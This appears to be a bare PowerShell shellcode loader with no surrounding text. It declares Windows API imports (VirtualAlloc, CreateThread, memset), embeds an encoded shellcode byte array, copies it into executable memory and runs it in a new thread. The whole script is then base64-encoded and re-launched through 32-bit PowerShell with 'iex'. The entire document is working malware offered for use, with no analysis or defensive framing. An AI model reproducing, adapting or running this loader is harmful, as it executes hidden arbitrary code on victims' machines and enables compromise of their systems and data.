
$pQW1q0 = '$BiLa = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $BiLa -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb9,0xbf,0x14,0x1a,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x59,0x31,0x58,0x13,0x83,0xc0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0x80,0x11,0x19,0x4e,0x02,0x68,0x4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0xd5,0x94,0xdd,0x14,0x52,0xe0,0xdd,0x9f,0x28,0xe4,0x65,0x43,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xea,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0xb7,0x37,0x0b,0x39,0x55,0x23,0x26,0x60,0x31,0xdd,0x5c,0xef,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0x41,0x59,0x5b,0xaf,0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x9f,0xcd,0x0f,0x16,0xda,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37,0x5a,0xb7,0x01,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0xfa,0x3a,0xa1,0x6f,0xe4,0x14,0x29,0x05,0x5c,0x06,0x2f,0x1a,0xb5,0x65,0x63,0xb6,0x65,0xdf,0xeb,0x15,0x8c,0xc7,0x90,0x9a,0x45,0x72,0xa6,0x10,0x6c,0x33,0x52,0x02,0x18,0x3b,0x29,0x16,0x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35,0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02,0x66,0x7e,0xe3,0x30,0x79,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0x30,0x22,0x91,0xff,0x31,0x4d,0x3e,0x65,0xbb,0xdb,0xdc,0x00,0x2b,0x7d,0x40,0xa0,0xce,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1a,0x35,0x5c,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cz5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cz5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cz5,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($pQW1q0));$pQW = "-e ";if([IntPtr]::Size -eq 8){$6hAf = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $6hAf $pQW $e"}else{;iex "& powershell $pQW $e";}

